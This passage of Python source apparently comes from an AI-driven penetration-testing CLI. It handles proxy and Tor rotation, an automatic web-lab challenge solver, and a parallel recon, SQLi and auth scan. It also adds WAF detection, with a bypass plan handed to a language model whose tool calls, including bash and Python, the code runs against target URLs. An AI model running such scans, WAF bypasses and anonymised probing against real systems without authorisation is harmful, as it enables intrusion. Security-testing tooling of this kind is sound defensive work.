                self.console.print(f"[cyan]{self.s.get('proxy_api_presets', '사용 가능한 무료 프록시 API 프리셋:')}[/cyan]")
                for i, (name, url) in enumerate(presets, 1):
                    self.console.print(f"  [bold]{i}.[/bold] {name}")
                    self.console.print(f"     [dim]{url[:80]}...[/dim]")
                from rich.prompt import Prompt as _P
                choice = _P.ask(self.s.get("proxy_api_choice", "번호 선택 (0=직접입력)"), default="1")
                if choice == "0":
                    api_url = _P.ask(self.s.get("proxy_api_url_input", "API URL 입력")).strip()
                else:
                    try:
                        api_url = presets[int(choice) - 1][1]
                    except (ValueError, IndexError):
                        self._warn(self.s.get("proxy_api_bad_choice", "잘못된 선택."))
                        return
                with self.console.status(f"[cyan]🌐 {api_url[:60]}...[/cyan]"):
                    n = pm.fetch_from_api(api_url)
                self._success(
                    self.s.get("proxy_api_fetched", "🌐 API에서 {n}개 프록시 수집됨").format(n=n)
                )
                if n > 0:
                    pm.save_config()  # v3.2.77: 세션 간 저장
            return

        # ─ tor ───────────────────────────────────────────────────────
        if sub == "tor":
            ctrl_pass = sub_arg  # 비밀번호 없으면 빈 문자열
            ok = pm.enable_tor(ctrl_pass)
            if ok:
                self._success(
                    self.s.get("proxy_tor_enabled",
                               "🧅 Tor 모드 활성화 — socks5h://127.0.0.1:9050 사용 중\n"
                               "   stem 설치됨: {stem} | 회로 교체 지원: {stem}").format(
                        stem="✅" if pm.pool_status()["stem"] else "❌ (pip install stem)"
                    )
                )
                if not pm.pool_status()["stem"]:
                    self.console.print(f"[dim]{self.s.get('proxy_tor_stem_missing', '   Tor 회로 자동 교체 비활성화 (stem 미설치)\\n   → pip install stem  후 재실행')}[/dim]")
                pm.save_config()  # v3.2.77: 세션 간 저장
            else:
                self._warn(self.s.get("proxy_tor_fail", "Tor 추가 실패."))
            return

        # ─ rotate ────────────────────────────────────────────────────
        if sub == "rotate":
            entry = pm.rotate()
            if entry:
                self._success(
                    self.s.get("proxy_rotated", "🔄 프록시 교체됨 → {url}").format(url=str(entry))
                )
            else:
                self._warn(self.s.get("proxy_pool_empty", "⚠ 사용 가능한 프록시 없음"))
            return

        # ─ test ──────────────────────────────────────────────────────
        if sub == "test":
            cur = pm.current()
            if not cur:
                self._warn(self.s.get("proxy_pool_empty", "⚠ 사용 가능한 프록시 없음"))
                return
            # v3.2.74: PySocks 사전 경고 (SOCKS5 + PySocks 미설치)
            try:
                import socks as _socks_chk  # noqa: F401
                _pysocks_ok = True
            except ImportError:
                _pysocks_ok = False
            if cur.scheme.startswith("socks") and not _pysocks_ok:
                self._warn(
                    self.s.get(
                        "proxy_pysocks_missing",
                        "⚠ PySocks 미설치 — SOCKS5/4 사용 불가\n"
                        "설치 명령: pip install 'requests[socks]'",
                    )
                )
            with self.console.status(
                f"[cyan]{self.s.get('proxy_test_checking', '🔍 {url} 연결 테스트 중... (최대 15초)').format(url=str(cur))}[/cyan]"
            ):
                ok, detail = pm.test_proxy(cur)
            if ok:
                self._success(
                    self.s.get(
                        "proxy_test_ok",
                        "✅ 프록시 연결 성공: {url} (지연: {lat}ms)",
                    ).format(url=str(cur), lat=f"{cur.latency_ms:.0f}")
                    + f"\n   {detail}"
                )
            else:
                self._warn(
                    self.s.get(
                        "proxy_test_fail",
                        "❌ 프록시 연결 실패: {url}",
                    ).format(url=str(cur))
                )
                # v3.2.74: 실패 원인 상세 출력
                self.console.print(f"   [red]{self.s.get('proxy_test_fail_reason', '   원인: {detail}').format(detail=detail)}[/red]")
                if "PySocks" in detail or "pip install" in detail:
                    self.console.print(f"   [yellow]{self.s.get('proxy_fix_pysocks', '→ 해결: pip install requests[socks]')}[/yellow]")
                elif "ProxyError" in detail or "SOCKS" in detail:
                    self.console.print(f"   [yellow]{self.s.get('proxy_fix_connection', '→ IP/포트/인증정보를 확인하세요.')}[/yellow]")
                elif "Timeout" in detail:
                    self.console.print(f"   [yellow]{self.s.get('proxy_fix_timeout', '→ 타임아웃. 다른 프록시를 시도하세요.')}[/yellow]")
            return

        # ─ unban ─────────────────────────────────────────────────────
        if sub == "unban":
            n = pm.unban_all()
            self._success(
                self.s.get("proxy_unban", "✅ 밴 해제됨: {n}개").format(n=n)
            )
            return

        # ─ clear ─────────────────────────────────────────────────────
        if sub == "clear":
            pm.clear()
            pm.save_config()  # v3.2.77: 세션 간 저장 (빈 풀로 덮어씀)
            self._success(self.s.get("proxy_cleared", "🗑 프록시 풀 초기화됨"))
            return

        # ─ off ───────────────────────────────────────────────────────
        if sub == "off":
            pm.disable()
            pm.save_config()  # v3.2.77: 비활성화 상태도 저장
            self._success(self.s.get("proxy_disabled", "⛔ 프록시 비활성화됨"))
            return

        # ─ testall ───────────────────────────────────────────────────
        if sub in ("testall", "test_all", "testall"):
            all_items = pm.list_all()
            if not all_items:
                self._warn(self.s.get("proxy_pool_empty", "⚠ 사용 가능한 프록시 없음"))
                return
            total = len(all_items)
            s = self.s
            _hdr = s.get("proxy_testall_header",
                "🔍 프록시 풀 전체 테스트 시작 ({total}개) — 완료까지 최대 {secs}초 소요..."
            ).format(total=total, secs=total * 15)
            self.console.print(f"[cyan]{_hdr}[/cyan]")
            with self.console.status(f"[cyan]{s.get('proxy_testall_testing', '🔍 테스트 중...')}[/cyan]"):
                results = pm.test_all()
            # 결과 테이블 출력
            from rich.table import Table as _Table
            rtbl = _Table(title="🌐 Proxy Test Results", border_style="cyan", expand=False)
            rtbl.add_column("#", style="dim")
            rtbl.add_column(s.get("proxy_testall_col_proxy", "프록시"), style="cyan")
            rtbl.add_column(s.get("proxy_testall_col_result", "결과"), style="white")
            rtbl.add_column(s.get("proxy_testall_col_detail", "상세"), style="dim")
            ok_count = 0
            fail_count = 0
            for i, (proxy_str, (ok, detail)) in enumerate(results.items(), 1):
                if ok:
                    ok_count += 1
                    rtbl.add_row(str(i), proxy_str, "[green]✅ OK[/]", detail[:60])
                else:
                    fail_count += 1
                    rtbl.add_row(str(i), proxy_str, "[red]❌ FAIL[/]", detail[:60])
            self.console.print(rtbl)
            _summary = s.get("proxy_testall_summary",
                "결과: ✅ 성공 {ok}개  ❌ 실패 {fail}개 (실패 프록시는 자동 밴됨)"
            ).format(ok=ok_count, fail=fail_count)
            self.console.print(f"[cyan]{_summary}[/cyan]")
            pm.save_config()  # 테스트 후 밴된 정보 반영해서 저장
            return

        self._warn(self.s.get("proxy_usage",
            "사용법: /proxy [list|add|file|api|tor|rotate|test|testall|unban|clear|off]\n"
            "예시:   /proxy add socks5://1.2.3.4:1080\n"
            "        /proxy tor\n"
            "        /proxy api\n"
            "        /proxy file ~/proxies.txt\n"
            "        /proxy testall"))

    def _show_token_usage(self) -> None:
        """루프마다 토큰 사용량 추정 + 상태바에 표시."""
        # 히스토리에서 토큰 추정 (실제 API 응답의 usage 필드가 없으면 추정)
        total_chars = sum(len(m.content) for m in self.history)
        est_tokens  = total_chars // 4  # 대략 4자 = 1토큰
        self._token_usage["total"] = est_tokens
        # 모델별 가격 추정 (DeepSeek: $0.14/1M tokens)
        self._cost_usd = est_tokens / 1_000_000 * 0.14
        self.console.print(
            f"[{THEME['dim']}]  💰 ~{est_tokens:,} tokens  ${self._cost_usd:.4f}[/]"
        )

    # ── /ctf — 웹 실습 환경 보안 점검 ────────────────────────────

    def _cmd_ctf(self, arg: str = "") -> None:
        """웹 실습 환경 보안 점검 엔진.

        사용법:
          /ctf <url>                — 플랫폼 전체 항목 보안 점검
          /ctf <url> --resume=no   — 이전 진행상황 무시하고 처음부터
          /ctf <url> --headless=no — 브라우저 화면 표시 (디버깅용)
          /ctf <url> --status      — 현재 진행상황만 출력
          /ctf <url> --cookie "PHPSESSID=xxx"  — 세션 쿠키 지정

        예시:
          /ctf http://localhost:8888
          /ctf http://192.168.1.100:8080 --cookie "token=abc123"
          /ctf http://lab.example.com --headless=no --resume=no
        """
        lang = getattr(self, "_lang", "ko")

        if not arg.strip():
            self.console.print(
                f"[{THEME['warn']}]{self.s.get('ctf_usage', self._CTF_USAGE[lang])}[/]"
            )
            return

        # ── 인자 파싱 ─────────────────────────────────────────────
        parts = arg.strip().split()
        base_url = parts[0]
        resume = True
        headless = True
        cookies: dict = {}
        status_only = False

        for part in parts[1:]:
            lp = part.lower()
            if lp == "--resume=no":
                resume = False
            elif lp == "--headless=no":
                headless = False
            elif lp == "--status":
                status_only = True
            elif lp.startswith("--cookie"):
                # --cookie "key=value" or --cookie=key=value
                raw = part.split("=", 1)[1].strip().strip('"\'') if "=" in part else ""
                if not raw and len(parts) > parts.index(part) + 1:
                    raw = parts[parts.index(part) + 1].strip().strip('"\'')
                if "=" in raw:
                    k, v = raw.split("=", 1)
                    cookies[k] = v

        # ── 진행상황만 출력 ─────────────────────────────────────────
        if status_only:
            from ..tools.ctf_lab_engine import load_state
            state = load_state(base_url)
            solved = state.get("solved", [])
            total = state.get("total", "?")
            last = state.get("last_updated", "N/A")
            self.console.print(
                f"[{THEME['info']}]{self.s.get('lab_progress_title', '📊 Web Lab Progress')}[/]\n"
                f"  Target: {base_url}\n"
                f"  Done: {len(solved)} / {total}\n"
                f"  Last updated: {last}"
            )
            return

        # ── 실행 ──────────────────────────────────────────────────
        _lang = lang

        def _log(msg: str) -> None:
            self.console.print(f"[{THEME['dim']}]{msg}[/]")

        def _progress(cur: int, total: int, ch) -> None:
            pct = cur / total * 100 if total else 0
            bar_filled = int(pct / 5)
            bar = "█" * bar_filled + "░" * (20 - bar_filled)
            label = {
                "ko": f"🎯 [{cur}/{total}] {ch.title[:30]}",
                "zh": f"🎯 [{cur}/{total}] {ch.title[:30]}",
                "en": f"🎯 [{cur}/{total}] {ch.title[:30]}",
            }.get(_lang, f"[{cur}/{total}]")
            self.console.print(
                f"[{THEME['primary']}]{bar} {pct:.0f}% — {label}[/]"
            )

        start_msg = {
            "ko": f"🏁 웹 실습 환경 점검 시작: {base_url}\n"
                  f"   Playwright: {'활성' if headless else '브라우저 표시'} | "
                  f"이어서: {'예' if resume else '아니오'}",
            "zh": f"🏁 Web实验环境扫描开始: {base_url}\n"
                  f"   Playwright: {'无头' if headless else '显示浏览器'} | "
                  f"续上次: {'是' if resume else '否'}",
            "en": f"🏁 web lab scan started: {base_url}\n"
                  f"   Playwright: {'headless' if headless else 'visible'} | "
                  f"resume: {'yes' if resume else 'no'}",
        }.get(lang, f"🏁 scan: {base_url}")

        self.console.print(f"[{THEME['success']}]{start_msg}[/]")

        try:
            from ..tools.ctf_lab_engine import CTFLabEngine
            engine = CTFLabEngine(
                base_url=base_url,
                on_log=_log,
                on_progress=_progress,
                resume=resume,
                headless=headless,
                use_playwright=True,
                cookies=cookies,
            )
            report = engine.run()
            engine.close()

            # ── 결과 출력 ──────────────────────────────────────────
            rate = (report.solved / report.total * 100) if report.total else 0
            result_msg = {
                "ko": (
                    f"\n🏆 웹 실습 점검 결과\n"
                    f"  ✅ 완료: {report.solved} / {report.total}  ({rate:.1f}%)\n"
                    f"  ❌ 실패: {report.failed}개\n"
                    f"  ⏱  소요: {report.elapsed_sec:.1f}초\n"
                    f"  💾 상태: ~/Desktop/dump/ctf_state/ 에 자동 저장됨"
                ),
                "zh": (
                    f"\n🏆 Web实验安全扫描结果\n"
                    f"  ✅ 완료: {report.solved} / {report.total}  ({rate:.1f}%)\n"
                    f"  ❌ 失败: {report.failed}个\n"
                    f"  ⏱  耗时: {report.elapsed_sec:.1f}秒\n"
                    f"  💾 状态: 已自动保存至 ~/Desktop/dump/ctf_state/"
                ),
                "en": (
                    f"\n🏆 Web Lab Scan Results\n"
                    f"  ✅ Solved: {report.solved} / {report.total}  ({rate:.1f}%)\n"
                    f"  ❌ Failed: {report.failed}\n"
                    f"  ⏱  Time: {report.elapsed_sec:.1f}s\n"
                    f"  💾 State saved to ~/Desktop/dump/ctf_state/"
                ),
            }.get(lang, report.summary())

            self.console.print(f"[{THEME['success']}]{result_msg}[/]")

            # 실패한 항목 목록 출력
            failed = [ch for ch in report.challenges if not ch.solved and ch.error]
            if failed:
                self.console.print(f"[{THEME['warn']}]\n{self.s.get('ctf_failed_list', 'Failed challenges:')}[/]")
                for ch in failed[:10]:
                    self.console.print(
                        f"[{THEME['dim']}]  • [{ch.category}] {ch.title}: {ch.error}[/]"
                    )

        except ImportError:
            self.console.print(f"[{THEME['error']}]{self.s.get('ctf_load_error', '❌ ctf_lab_engine load failed — check bingo/tools/ctf_lab_engine.py')}[/]")
        except Exception as e:
            self.console.print(f"[{THEME['error']}]{self.s.get('ctf_check_error', '❌ CTF lab check error: {e}').format(e=e)}[/]")

    _CTF_USAGE = {
        "ko": (
            "사용법: /ctf <url>\n"
            "  예) /ctf http://localhost:8888\n"
            "      /ctf http://localhost:8888 --resume=no\n"
            "      /ctf http://localhost:8888 --headless=no\n"
            "      /ctf http://localhost:8888 --status\n"
            "      /ctf http://lab.com --cookie \"PHPSESSID=abc\""
        ),
        "zh": (
            "用法: /ctf <url>\n"
            "  例) /ctf http://localhost:8888\n"
            "      /ctf http://localhost:8888 --resume=no\n"
            "      /ctf http://localhost:8888 --headless=no\n"
            "      /ctf http://localhost:8888 --status"
        ),
        "en": (
            "Usage: /ctf <url>\n"
            "  e.g. /ctf http://localhost:8888\n"
            "       /ctf http://localhost:8888 --resume=no\n"
            "       /ctf http://localhost:8888 --headless=no\n"
            "       /ctf http://localhost:8888 --status"
        ),
    }

    # ── Red Team 명령어 ───────────────────────────────────────────

    def _cmd_mscan(self, url: str = "") -> None:
        """멀티 에이전트 병렬 스캔 — Cursor처럼 전문 에이전트 동시 실행."""
        if not url:
            from rich.prompt import Prompt
            url = Prompt.ask(f"[{THEME['primary']}]타겟 URL[/]").strip()
        if not url:
            return

        from rich.panel import Panel as _Panel

        # 툴 자동 설치 확인
        with self.console.status(f"[cyan]{self.s.get('tool_init', 'Initializing tools...')}[/cyan]"):
            try:
                import shutil as _sh
                from pathlib import Path as _P
                _bingo_dir = _P.home() / ".bingo"
                _bingo_dir.mkdir(exist_ok=True)
                _tools_dir = _P(__file__).parent.parent / "tools"
                for _m in ["agent_tools.py", "recon_tools.py", "web_tools.py", "auth_tools.py"]:
                    _src = _tools_dir / _m
                    _dst = _bingo_dir / _m
                    if _src.exists():
                        _sh.copy2(str(_src), str(_dst))
            except Exception as _e:
                self.console.print(f"[dim]{self.s.get('tool_install_warn', 'Tool install warning: {e}').format(e=_e)}[/dim]")

        self.console.print(_Panel(
            f"[bold cyan]🚀 {self.s.get('mscan_title', 'Multi-Agent Scan')}[/bold cyan]\n"
            f"[dim]{self.s.get('mscan_subtitle', 'Recon + SQLi + WebVuln + Auth — parallel')}[/dim]\n"
            f"[bold]{url}[/bold]",
            border_style="cyan",
            expand=False,
        ))

        from ..core.multi_agent import MultiAgent
        agent = MultiAgent(console=self.console)
        results = agent.run(url)

        # agent_state 업데이트 (SQLi 결과 반영)
        sqli = results.get("💉 SQLi") or {}
        # Multi-agent heuristics alone must not mark target memory as confirmed.
        # Require an extracted DB artifact or an explicit verified oracle flag.
        if sqli.get("injectable") and (
            sqli.get("database")
            or sqli.get("tables")
            or sqli.get("oracle_confirmed") is True
        ):
            self._agent_state["confirmed_sqli"] = True
            self._agent_state["db_name"]  = sqli.get("database")
            self._agent_state["tables"]   = sqli.get("tables", [])
            self._agent_state["waf"]      = sqli.get("waf")
            self._agent_state["target"]   = url
            self._save_agent_state()

        # 결과를 대화 컨텍스트에 주입 (AI가 이어서 작업 가능하게)
        import json
        summary = json.dumps(results, ensure_ascii=False, default=str)[:2000]
        self.history.append(Message(
            role="user",
            content=(
                f"=== MULTI-AGENT SCAN RESULTS for {url} ===\n"
                f"{summary}\n"
                f"=== END SCAN RESULTS ===\n"
                + self.s.get("scan_summary_prompt", "Analyze the scan results above and summarize vulnerabilities found.")
            )
        ))
        self._send_message("")

    def _cmd_scan(self, url: str = "") -> None:
        if not url:
            url = Prompt.ask(f"[{THEME['primary']}]{self.s['target_url_prompt']}[/]").strip()
        if not url:
            return

        self.console.print(f"\n[{THEME['error']}]{self.s['scan_title']}: {url}[/]")
        self.console.print(f"[{THEME['dim']}]{self.s['scan_hint'].format(url=url)}[/]\n")

        from ..tools.http_probe import HttpProbe
        from ..tools.waf_bypass import WafDetector
        from ..redteam.phases import __init__ as _  # noqa

        probe = HttpProbe(url, delay=0.3)

        # 빠른 정찰
        with self.console.status(f"[{THEME['secondary']}]{self.s['scan_recon']}[/]"):
            fp = probe.fingerprint()
            sensitive = probe.scan_sensitive_files()
            admin = probe.check_admin_panels()

            # WAF
            detector = WafDetector(probe)
            waf = detector.detect(url)

        # 결과 출력
        table = Table(title=f"[{THEME['primary']}]{self.s['scan_result_title']}[/]",
                      border_style=THEME["primary"], show_header=True)
        table.add_column(self.s["scan_col_item"], style=THEME["secondary"])
        table.add_column(self.s["scan_col_result"], style="white")

        table.add_row(self.s["scan_tech"], ", ".join(fp.get("tech", [])) or "-")
        table.add_row("CMS", fp.get("cms", "-"))
        table.add_row(self.s["scan_waf"], f"{waf.waf_type} ({waf.confidence})" if waf.detected else self.s["scan_waf_none"])
        table.add_row(self.s["scan_sensitive"], str(len(sensitive)))
        table.add_row(self.s["scan_admin"], str(len(admin)))
        self.console.print(table)

        if sensitive:
            self.console.print(f"\n[{THEME['error']}]{self.s['scan_sensitive_found']}:[/]")
            for s in sensitive[:5]:
                self.console.print(f"  [{THEME['warn']}]{s['path']}[/] [{s['status']}]")

        if admin:
            self.console.print(f"\n[{THEME['error']}]{self.s['scan_admin_found']}:[/]")
            for a in admin[:3]:
                self.console.print(f"  [{THEME['warn']}]{a['path']}[/] [{a['status']}]")

        self.console.print(f"\n[{THEME['dim']}]{self.s['scan_full_hint'].format(url=url)}[/]\n")

    def _cmd_waf(self, url: str = "") -> None:
        if not url:
            url = Prompt.ask(f"[{THEME['primary']}]{self.s['target_url_prompt']}[/]").strip()
        if not url:
            return

        from ..tools.http_probe import HttpProbe
        from ..tools.waf_bypass import WafDetector, WafBypassEngine

        self.console.print(f"\n[{THEME['warn']}]{self.s['waf_analyzing']}: {url}[/]")
        probe = HttpProbe(url)
        detector = WafDetector(probe)

        with self.console.status(f"[{THEME['warn']}]{self.s['waf_detecting']}[/]"):
            result = detector.detect(url)

        if result.detected:
            self.console.print(f"[{THEME['error']}]{self.s['waf_detected']}: {result.waf_type}  {self.s['waf_confidence']}: {result.confidence}[/]")
            self.console.print(f"[{THEME['dim']}]{self.s['waf_evidence']}: {result.evidence}[/]")
            self.console.print(f"\n[{THEME['secondary']}]{self.s['waf_priority']}:[/]")
            for i, s in enumerate(result.bypass_priority, 1):
                self.console.print(f"  {i}. {s}")

            engine = WafBypassEngine(
                probe,
                on_progress=lambda m: self.console.print(f"[{THEME['dim']}]{m}[/]")
            )
            bypass_summary = engine.get_bypass_summary(result.waf_type)
            ai_prompt = (
                "[WAF_AI_SKILL_PLAN]\n"
                f"WAF detected: {result.waf_type}\n"
                f"Confidence: {result.confidence}\n"
                f"Evidence: {result.evidence}\n\n"
                f"{bypass_summary}\n\n"
                "Use waf_bypass skill memory and choose exactly one bounded next verification step. "
                "Do not spray the full bypass library. Preserve the exact target host and request profile."
            )
            self.console.print(f"\n[{THEME['secondary']}]{self.s['waf_ai_request']}[/]")
            model_cfg = self.config.get_active_model_config()
            if model_cfg:
                from ..models.registry import ModelRegistry
                self.history.append(Message(role="user", content=ai_prompt))
                response = self._stream_response(
                    ModelRegistry.build(model_cfg).chat_stream(self._build_messages(""))
                )
                if response:
                    self.history.append(Message(role="assistant", content=response))
                    self._execute_ai_commands(response)
            else:
                self.console.print(f"[{THEME['dim']}]{bypass_summary}[/]")
        else:
            self.console.print(f"[{THEME['success']}]{self.s['waf_none']}[/]")

    def _run_code_blocks(self, response: str, _loaded_skills: set) -> list[str]:
        """AI 응답에서 Python/Bash 블록 추출 후 병렬 실행.
        bounded timeout/idle watchdog 적용. 모든 블록 동시 실행 후 결과 수집.

        v5.2.0: TOOL_CALL 아키텍처 — bash 블록보다 우선 처리.
        LLM이 TOOL_CALL:{"name":"...","args":{...}} 형식으로 호출하면
        pentest_tools.py 의 Python 함수를 직접 실행 → 환각 완전 차단.
        """
        import re, subprocess, tempfile, os, threading
        from pathlib import Path
        from rich.markup import escape as _resc
        self._last_execution_context = {
            "executed": False,
            "source": "runtime",
            "scripts": [],
            "response_bytes": 0,
        }

        # ══════════════════════════════════════════════════════════════════════
        # v6.2.145 ── XML tool_call 형식 자동 변환 (Type A 자동 교정기)
        # AI가 가끔 <tool_call>{"name":...,"arguments":{...}}</tool_call> XML 형식을 출력.
        # bingo는 TOOL_CALL:{} 형식만 인식하므로 자동 변환.
        # 변환: <tool_call>{"name":"X","arguments":{...}}</tool_call>
        #      → TOOL_CALL:{"name":"X","args":{...}}
        import re as _re_tc
        def _convert_xml_toolcall(text: str) -> str:
            """<tool_call>...</tool_call> XML 형식 → TOOL_CALL:{} 형식 자동 변환"""
            _xml_tc_pat = _re_tc.compile(
                r'<tool_call>\s*(\{.*?\})\s*</tool_call>',
                _re_tc.DOTALL | _re_tc.IGNORECASE,
            )
            def _replace_tc(m: "_re_tc.Match") -> str:
                try:
                    import json as _j
                    _obj = _j.loads(m.group(1))
                    _name = str(_obj.get("name", "") or _obj.get("tool_name", ""))
                    _args = _obj.get("arguments", _obj.get("args", _obj.get("parameters", {})))
                    if not isinstance(_args, dict):
                        _args = {}
                    return "TOOL_CALL:" + _j.dumps({"name": _name, "args": _args}, ensure_ascii=False)
                except Exception:
                    return m.group(0)
            if "<tool_call>" in text.lower():
                text = _xml_tc_pat.sub(_replace_tc, text)
            return text
        response = _convert_xml_toolcall(response)
        response, _silent_tool_fixes = _normalize_tool_call_response(response)

        # v5.2.0 ── TOOL_CALL 파서 (bash 블록 처리 이전에 실행)
        # 형식: TOOL_CALL:{"name":"sqli_timebased","args":{"url":"...","param":"id"}}
        # ══════════════════════════════════════════════════════════════════════
        # v5.2.3 fix: 중첩 {} 파싱 버그 수정 — 비탐욕 정규식 대신 괄호 카운터 사용
        def _extract_tool_call_jsons(text: str) -> list[str]:
            """TOOL_CALL: 뒤 JSON을 중괄호 깊이 카운팅으로 추출 (중첩 {} 지원)"""
            found: list[str] = []
            for _m in re.finditer(r'TOOL_CALL\s*:\s*', text):
                pos = _m.end()
                if pos >= len(text) or text[pos] != '{':
                    continue
                depth, j, in_str, esc = 0, pos, False, False
                while j < len(text):
                    c = text[j]
                    if esc:
                        esc = False
                    elif c == '\\' and in_str:
                        esc = True
                    elif c == '"':
                        in_str = not in_str
                    elif not in_str:
                        if c == '{':
                            depth += 1
                        elif c == '}':
                            depth -= 1
                            if depth == 0:
                                found.append(text[pos: j + 1])
                                break
                    j += 1
            return found

        _tool_matches = _extract_tool_call_jsons(response)

        if _tool_matches:
            self._compact_latest_assistant_tool_history(response)
            tool_results: list[str] = []
            try:
                from ..tools_ext.pentest_tools import execute_tool, TOOL_REGISTRY
            except ImportError:
                execute_tool = None
                TOOL_REGISTRY = {}

            # ── v6.2.179 Type A: TOOL_CALL 실행 중 UI '不动/卡死' 방지 ──────────
            # 증상(채팅/스크린샷): AI가 run_bash + http_get×N 을 한 번에 쏟아낸 뒤
            # 실행 중 화면에 아무 진행도 안 보여 '멈춤'으로 오인.
            # (백엔드는 동작 중 — Ctrl+C 후 continue 하면 결과 나옴)
            # 수정: 진행 표시 + 5초 heartbeat + flush + Ctrl+C로 남은 도구 스킵
            #      + 배치 http_get 은 curl 우선(Playwright×N 수분 정지 방지)
            _MAX_TOOLS_PER_TURN = 10
            _MAX_HTTP_GET_PER_TURN = 6
            _total_tc = len(_tool_matches)
            _http_get_done = 0
            _tools_executed = 0
            _deferred_names: list[str] = []
            import sys as _sys_flush
            import threading as _thr_tool

            def _flush_ui() -> None:
                try:
                    self.console.file.flush()
                except Exception:
                    pass
                try:
                    _sys_flush.stdout.flush()
                    _sys_flush.stderr.flush()
                except Exception:
                    pass

            _lang_tc = getattr(self.config, "lang", "en")
            _tc_banner = {
                "ko": f"⚙ 도구 {_total_tc}개 실행 중… (진행 표시됨 / Ctrl+C=중단)",
                "zh": f"⚙ 正在执行 {_total_tc} 个工具…（会显示进度 / Ctrl+C=中断）",
                "en": f"⚙ Running {_total_tc} tools… (progress shown / Ctrl+C=stop)",
            }.get(_lang_tc, f"⚙ Running {_total_tc} tools…")
            self.console.print(f"[{THEME['accent']}]{_tc_banner}[/]")
            _flush_ui()

            for _tc_i, _raw_json in enumerate(_tool_matches):
                if self._agent_stop_flag.is_set():
                    _stop_tc = {
                        "ko": f"⏸ Ctrl+C — 남은 도구 {_total_tc - _tc_i}개 스킵",
                        "zh": f"⏸ Ctrl+C — 跳过剩余 {_total_tc - _tc_i} 个工具",
                        "en": f"⏸ Ctrl+C — skipped {_total_tc - _tc_i} remaining tools",
                    }.get(_lang_tc, "⏸ Interrupted")
                    self.console.print(f"[{THEME['warn']}]{_stop_tc}[/]")
                    _flush_ui()
                    tool_results.append(
                        "=== INTERRUPTED by Ctrl+C — remaining TOOL_CALLs skipped ===\n"
                        "Summarize partial results. Do NOT re-emit the same TOOL_CALL flood."
                    )
                    break

                # JSON 파싱
                # v6.2.40 FIX: re.sub(r'\s+', ' ') 제거 — 이것이 Python 코드의 들여쓰기를
                # 파괴하여 SyntaxError: expected 'except' or 'finally' block 의 근본 원인이었음.
                # JSON 표준은 토큰 사이 공백을 허용하므로 json.loads()는 그대로 처리 가능.
                # 리터럴 개행이 포함된 경우(비표준 LLM 출력)만 복구 메커니즘이 처리함.
                _call = _raw_json.strip()  # 원본 보존 (공백 정규화 없음)
                try:
                    _parsed = __import__("json").loads(_call)
                    _tool_name = str(_parsed.get("name", ""))
                    _tool_args = _parsed.get("args", {})
                    if not isinstance(_tool_args, dict):
                        _tool_args = {}
                except Exception as _je:
                    # ── v6.2.34: JSON 복구 시도 ──────────────────────────────
                    # script/code 필드의 복잡한 이스케이프 조합으로 json.loads 실패 시
                    # regex 기반 필드 추출로 폴백
                    # v6.2.40: _call 이 이제 원본 보존 버전이므로 Python 코드 들여쓰기 유지
                    _recovered = False
                    try:
                        import re as _re_json
                        # name 추출
                        _nm = _re_json.search(r'"name"\s*:\s*"([^"]+)"', _call)
                        if _nm:
                            _tool_name = _nm.group(1)
                            _tool_args = {}
                            # args 내부의 각 키:값 추출 (script/code 포함)
                            # script/code: "script": "..." 이지만 중간에 \n, \", \' 포함
                            # → "script" 이후 첫 " 부터 마지막 "} 직전까지 추출
                            for _fk in ("script", "code", "url", "param",
                                        "base_value", "method", "headers",
                                        "post_data", "dump_table", "timeout"):
                                _fv_m = _re_json.search(
                                    rf'"{_fk}"\s*:\s*"((?:[^"\\]|\\.)*)\"',
                                    _call, _re_json.DOTALL
                                )
                                if _fv_m:
                                    # JSON 이스케이프 해제
                                    import codecs as _cod
                                    try:
                                        _fv = _cod.decode(
                                            _fv_m.group(1).encode(), "unicode_escape"
                                        )
                                    except Exception:
                                        _fv = _fv_m.group(1)
                                    _tool_args[_fk] = _fv
                            # timeout 숫자 변환
                            if "timeout" in _tool_args:
                                try:
                                    _tool_args["timeout"] = int(str(_tool_args["timeout"]))
                                except Exception:
                                    _tool_args.pop("timeout", None)
                            _recovered = bool(_tool_args or _tool_name)
                    except Exception:
                        pass
                    if not _recovered:
                        tool_results.append(
                            f"TOOL_RESULT:{{'name':'?','error':'JSON parse failed: {_je}','success':false}}"
                        )
                        import os as _os
                        if _os.environ.get("BINGO_DEBUG"):
                            self.console.print(f"[dim red]  [TOOL_CALL DEBUG] raw={_raw_json!r}[/dim red]")
                            self.console.print(f"[dim red]TOOL_CALL JSON parse error: {_je}[/dim red]")
                        continue
                    # 복구 성공은 정상 실행 경로로 취급한다. 상세 정보는 디버그에서만 노출.
                    if __import__("os").environ.get("BINGO_DEBUG"):
                        self.console.print(f"[dim]TOOL_CALL JSON recovered: {_tool_name}[/dim]")

                if _tools_executed >= _MAX_TOOLS_PER_TURN:
                    _deferred_names.append(_tool_name or "?")
                    continue

                if _tool_name == "http_get":
                    if _http_get_done >= _MAX_HTTP_GET_PER_TURN:
                        _deferred_names.append("http_get")
                        tool_results.append(
                            f"=== TOOL_RESULT: http_get ===\n"
                            f"exit_code=-95  success=false\n"
                            f"--- output ---\n"
                            f"[HTTP_GET_BATCH_CAP] max {_MAX_HTTP_GET_PER_TURN} http_get/turn skipped.\n"
                            f"Probe many hosts with ONE run_bash curl loop, not N×http_get.\n"
                            f"URL: {str(_tool_args.get('url', ''))[:120]}\n"
                            f"=== END TOOL_RESULT ==="
                        )
                        continue
                    _tool_args = dict(_tool_args)
                    _tool_args["prefer_curl"] = True
                    try:
                        _to = int(_tool_args.get("timeout", 10) or 10)
                    except Exception:
                        _to = 10
                    _tool_args["timeout"] = min(max(_to, 3), 10)
                    _http_get_done += 1

                if _tool_name == "run_python":
                    import re as _report_guard_re
                    _report_code = str(_tool_args.get("code", "") or "")
                    _manual_report = bool(
                        _report_guard_re.search(
                            r'confirmed_vulnerabilities|security_assessment|'
                            r'\breport\s*=\s*\{[\s\S]{0,300}\bfindings\b',
                            _report_code,
                            _report_guard_re.I,
                        )
                        and _report_guard_re.search(
                            r'write_text\s*\(|json\.dump\s*\(|open\s*\([^)]*["\']w',
                            _report_code,
                            _report_guard_re.I,
                        )
                    )
                    if _manual_report:
                        _deferred_report = self.s.get(
                            "report_manual_artifact_blocked",
                            "[REPORT_REQUEST_DEFERRED] Manual model-authored report artifact skipped. "
                            "Emit TASK_COMPLETE; Bingo will generate the report from Finding IDs.",
                        )
                        tool_results.append(
                            "=== TOOL_RESULT: run_python ===\n"
                            "exit_code=0 success=true\n--- output ---\n"
                            + _deferred_report
                            + "\n=== END TOOL_RESULT ==="
                        )
                        continue

                if execute_tool is None:
                    tool_results.append(
